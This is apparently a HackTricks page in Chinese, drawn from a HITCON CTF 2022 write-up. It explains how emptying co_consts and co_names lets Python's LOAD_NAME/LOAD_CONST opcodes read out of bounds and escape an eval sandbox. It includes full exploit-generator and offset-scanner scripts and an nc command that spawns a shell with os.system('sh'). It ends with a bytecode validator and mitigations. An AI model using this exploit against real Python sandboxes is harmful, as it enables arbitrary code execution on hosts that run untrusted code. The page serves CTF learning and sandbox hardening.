# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**此信息取自** [**这篇 writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**。**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

我们可以利用 LOAD_NAME / LOAD_CONST opcode 中的 OOB read 功能来获取内存中的某些 symbol。这意味着可以使用类似 `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` 的技巧来获取你想要的 symbol（例如函数名）。

然后只需构造你的 exploit。

### Overview <a href="#overview-1" id="overview-1"></a>

源代码非常短，仅包含 4 行！
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
你可以输入任意 Python code，并将其编译为一个 [Python code object](https://docs.python.org/3/c-api/code.html)。不过，在 eval 该 code object 之前，其中的 `co_consts` 和 `co_names` 会被替换为空 tuple。

因此，所有包含 consts（例如数字、字符串等）或 names（例如变量、函数）的 expression，最终都可能导致 segmentation fault。

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segmentation fault 是如何发生的？

让我们从一个简单的示例开始，`[a, b, c]` 可以被编译为以下 bytecode。
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
但是，如果 `co_names` 变成空 tuple，会发生什么？`LOAD_NAME 2` opcode 仍然会被执行，并尝试从它原本应在的内存地址读取值。没错，这是一个越界读取（out-of-bound read）“feature”。

该解决方案的核心概念很简单。CPython 中的一些 opcode，例如 `LOAD_NAME` 和 `LOAD_CONST`，容易受到 OOB read 的影响。

它们会从 `consts` 或 `names` tuple 中读取索引为 `oparg` 的对象（这就是 `co_consts` 和 `co_names` 在底层的名称）。我们可以参考下面关于 `LOAD_CONST` 的简短代码片段，了解 CPython 在处理 `LOAD_CONST` opcode 时会做什么。
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
通过这种方式，我们可以利用 OOB feature 从任意内存偏移量获取一个“name”。为了确认它的名称及其偏移量，只需不断尝试 `LOAD_NAME 0`、`LOAD_NAME 1` ... `LOAD_NAME 99` ... 你可能会在 oparg > 700 的位置找到一些内容。当然，你也可以尝试使用 `gdb` 查看内存布局，但我不认为这样会更容易？

### 生成 Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

获取这些有用的 names / consts 偏移量后，我们要如何从该偏移量获取 name / const 并使用它呢？这里有一个技巧：\
假设我们可以在偏移量 5（`LOAD_NAME 5`）处获取一个 `__getattribute__` name，并且 `co_names=()`，那么只需执行以下操作：
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> 注意，不必将其命名为 `__getattribute__`，你可以将其命名得更短或更奇怪一些

只需查看它的 bytecode，就能理解其中的原因：
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
注意，`LOAD_ATTR` 也会从 `co_names` 中获取名称。Python 会从相同的 offset 加载名称，因此第二个 `__getattribute__` 仍然从 offset=5 加载。利用这一特性，只要名称位于附近的内存中，我们就可以使用任意名称。

生成数字应该很简单：

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

由于长度限制，我没有使用 consts。

首先，这是一个用于查找这些名称 offset 的脚本。
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
以下内容用于生成真正的 Python exploit。
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
它基本执行以下操作；对于这些字符串，我们通过 `__dir__` 方法获取：
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### 版本说明和受影响的 opcodes（Python 3.11–3.13）

- CPython bytecode 仍然通过整数操作数索引 `co_consts` 和 `co_names` tuples。如果攻击者能够使这些 tuples 为空（或小于 bytecode 所使用的最大索引），解释器就会针对该索引读取越界内存，从附近内存中获取任意 PyObject 指针。相关 opcodes 至少包括：
- `LOAD_CONST consti` → 读取 `co_consts[consti]`。
- `LOAD_NAME namei`、`STORE_NAME`、`DELETE_NAME`、`LOAD_GLOBAL`、`STORE_GLOBAL`、`IMPORT_NAME`、`IMPORT_FROM`、`LOAD_ATTR`、`STORE_ATTR` → 从 `co_names[...]` 读取名称（对于 3.11+，注意 `LOAD_ATTR`/`LOAD_GLOBAL` 会在低位存储 flag bits；实际索引为 `namei >> 1`）。有关每个版本的确切语义，请参阅 disassembler docs。[Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ 引入了 adaptive/inline caches，会在 instructions 之间添加隐藏的 `CACHE` entries。这不会改变 OOB primitive；但如果你手工构造 bytecode，在构建 `co_code` 时必须将这些 cache entries 计算在内。

实际影响：当你能够控制 code object（例如通过 `CodeType.replace(...)`）并缩小 `co_consts`/`co_names` 时，此页面中的 technique 仍可在 CPython 3.11、3.12 和 3.13 上使用。

### 用于查找有用 OOB indexes 的快速 scanner（兼容 3.11+/3.12+）

如果你希望直接从 bytecode 中探测有趣的 objects，而不是从 high-level source 中探测，可以生成最小的 code objects 并对 indexes 进行 brute force。下面的 helper 会在需要时自动插入 inline caches。
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
注意事项
- 如果要探测名称，请将 `LOAD_CONST` 替换为 `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR`，并相应调整栈的使用方式。
- 如有需要，请使用 `EXTENDED_ARG` 或多个字节的 `arg` 来访问大于 255 的索引。像上面使用 `dis` 构建时，你只能控制低字节；对于更大的索引，请自行构造原始字节，或将攻击拆分到多个加载操作中。

### 仅字节码 RCE 模式（co_consts OOB → builtins → eval/input）

确定某个 `co_consts` 索引可解析为 builtins module 后，即可通过操纵栈，在不使用任何 `co_names` 的情况下重建 `eval(input())`：
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
这种方法适用于以下 challenges：它们允许你直接控制 `co_code`，同时强制设置 `co_consts=()` 和 `co_names=()`（例如 BCTF 2024 “awpcode”）。该方法无需依赖 source-level tricks，并通过利用 bytecode stack ops 和 tuple builders 来保持 payload size 较小。

### sandbox 的防御检查与缓解措施

如果你正在编写一个用于编译/执行 untrusted code 或操作 code objects 的 Python “sandbox”，不要依赖 CPython 对 bytecode 使用的 tuple indexes 进行 bounds-check。相反，应在执行 code objects 之前自行进行验证。

实用的 validator（拒绝对 co_consts/co_names 的 OOB access）
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
补充的缓解措施
- 不要允许在不可信输入上任意调用 `CodeType.replace(...)`，或者对生成的 code object 添加严格的结构检查。
- 考虑使用带有 OS-level sandboxing（seccomp、job objects、containers）的独立进程运行不可信代码，而不是依赖 CPython semantics。

## References

- [1] [Splitline's HITCON CTF 2022 writeup "V O I D"（该技术及其 high-level exploit chain 的起源）](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python disassembler 文档（LOAD_CONST/LOAD_NAME/等指令的 indices semantics，以及 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` 的 low-bit flags）](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
